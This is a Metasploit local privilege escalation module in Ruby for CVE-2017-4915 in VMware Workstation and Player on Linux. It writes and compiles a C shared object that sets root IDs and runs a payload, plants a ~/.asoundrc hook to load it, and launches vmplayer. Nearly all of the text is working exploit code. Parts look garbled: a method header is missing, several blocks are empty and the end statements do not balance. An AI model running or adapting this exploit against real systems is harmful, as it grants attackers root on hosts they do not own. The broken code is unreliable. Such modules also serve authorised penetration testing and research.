# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;VMware Workstation ALSA Config File Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in VMware Workstation Pro and
        Player on Linux which allows users to escalate their privileges by
        using an ALSA configuration file to load and execute a shared object
        as root when launching a virtual machine with an attached sound card.
 
        This module has been tested successfully on VMware Player version
        12.5.0 on Debian Linux.
      },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-4915&#039; ],
          [ &#039;EDB&#039;, &#039;42045&#039; ],
          [ &#039;BID&#039;, &#039;98566&#039; ],
          [ &#039;URL&#039;, &#039;https://gist.github.com/bcoles/cd26a831473088afafefc93641e184a9&#039; ],
          [ &#039;URL&#039;, &#039;https://www.vmware.com/security/advisories/VMSA-2017-0009.html&#039; ],
          [ &#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1142&#039; ]
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jann Horn&#039;, # Discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;May 22 2017&#039;,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Linux x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;    => 30,
          &#039;PrependFork&#039; => true
        },
      &#039;DefaultTarget&#039;  => 1,
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Privileged&#039;     => true ))
    register_options [
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end
 
    vmplayer = cmd_exec &#039;which vmplayer&#039;
    if vmplayer.include? &#039;vmplayer&#039;
      vprint_good &#039;vmplayer is installed&#039;
    else
      print_error &#039;vmplayer is not installed. Exploitation will fail.&#039;
      return false
    end
 
    gcc = cmd_exec &#039;which gcc&#039;
    if gcc.include? &#039;gcc&#039;
      vprint_good &#039;gcc is installed&#039;
    else
      print_error &#039;gcc is not installed. Compiling will fail.&#039;
      return false
    end
 
    true
  end
 
  def check
      return CheckCode::Safe
    end
 
    begin
      config = read_file &#039;/etc/vmware/config&#039;
    rescue
      config = &#039;&#039;
    end
 
    if config =~ /player\.product\.version\s*=\s*"([\d\.]+)"/
      @version = Gem::Version.new $1.gsub(/\.$/, &#039;&#039;)
      vprint_status "VMware is version #{@version}"
    else
      print_error "Could not determine VMware version."
      return CheckCode::Unknown
    end
 
    if @version < Gem::Version.new(&#039;12.5.6&#039;)
      print_good &#039;Target version is vulnerable&#039;
      return CheckCode::Vulnerable
    end
 
    print_error &#039;Target version is not vulnerable&#039;
    CheckCode::Safe
  end
 
  def exploit
    if check == CheckCode::Safe
      print_error &#039;Target machine is not vulnerable&#039;
      return
    end
 
    @home_dir = cmd_exec &#039;echo ${HOME}&#039;
    unless @home_dir
      print_error "Could not find user&#039;s home directory"
      return
    end
 
    fname = ".#{rand_text_alphanumeric rand(10) + 5}"
    @base_dir = "#{datastore[&#039;WritableDir&#039;]}/#{fname}"
    cmd_exec "mkdir #{@base_dir}"
 
    so = %Q^
/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1142
Original shared object code by jhorn
*/
 
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <err.h>
 
extern char *program_invocation_short_name;
 
__attribute__((constructor)) void run(void) {
  uid_t ruid, euid, suid;
  if (getresuid(&ruid, &euid, &suid))
    err(1, "getresuid");
  if (ruid == 0 || euid == 0 || suid == 0) {
    if (setresuid(0, 0, 0) || setresgid(0, 0, 0))
      err(1, "setresxid");
    system("#{@base_dir}/#{fname}.elf");
    _exit(0);
  }
}
^
    vprint_status "Writing #{@base_dir}/#{fname}.c"
    write_file "#{@base_dir}/#{fname}.c", so
 
    vprint_status "Compiling #{@base_dir}/#{fname}.o"
    output = cmd_exec "gcc -fPIC -shared -o #{@base_dir}/#{fname}.so #{@base_dir}/#{fname}.c -Wall -ldl -std=gnu99"
    unless output == &#039;&#039;
      print_error "Compilation failed: #{output}"
      return
    end
 
    vmx = %Q|
.encoding = "UTF-8"
config.version = "8"
virtualHW.version = "8"
memsize = "4"
sound.fileName = "-1"
sound.autodetect = "TRUE"
displayName = "#{fname}"
guestOS = "other"
nvram = "#{fname}.nvram"
virtualHW.productCompatibility = "hosted"
gui.exitOnCLIHLT = "FALSE"
powerType.powerOff = "soft"
powerType.powerOn = "soft"
powerType.suspend = "soft"
powerType.reset = "soft"
monitor_control.disable_longmode = 1
|
    vprint_status "Writing #{@base_dir}/#{fname}.vmx"
    write_file "#{@base_dir}/#{fname}.vmx", vmx
 
    vprint_status "Writing #{@base_dir}/#{fname}.elf"
    write_file "#{@base_dir}/#{fname}.elf", generate_payload_exe
 
    vprint_status "Setting #{@base_dir}/#{fname}.elf executable"
    cmd_exec "chmod +x #{@base_dir}/#{fname}.elf"
 
    asoundrc = %Q|
hook_func.pulse_load_if_running {
  lib "#{@base_dir}/#{fname}.so"
  func "conf_pulse_hook_load_if_running"
}
|
    vprint_status "Writing #{@home_dir}/.asoundrc"
    write_file "#{@home_dir}/.asoundrc", asoundrc
 
    vprint_status &#039;Disabling VMware hint popups&#039;
    unless directory? "#{@home_dir}/.vmware"
      cmd_exec "mkdir #{@home_dir}/.vmware"
    end
 
      begin
      rescue
      end
    end
 
    else
    end
 
    print_status &#039;Launching VMware Player...&#039;
    cmd_exec "vmplayer #{@base_dir}/#{fname}.vmx"
  end
 
  def cleanup
    print_status "Removing #{@base_dir} directory"
    cmd_exec "rm &#039;#{@base_dir}&#039; -rf"
 
    print_status "Removing #{@home_dir}/.asoundrc"
    cmd_exec "rm &#039;#{@home_dir}/.asoundrc&#039;"
 
      print_status "Removing #{@home_dir}/.vmware directory"
      cmd_exec "rm &#039;#{@home_dir}/.vmware&#039; -rf"
    end
  end
 
  def on_new_session(session)
    # if we don&#039;t /bin/sh here, our payload times out
    session.shell_command_token &#039;/bin/sh&#039;
    super
  end
end

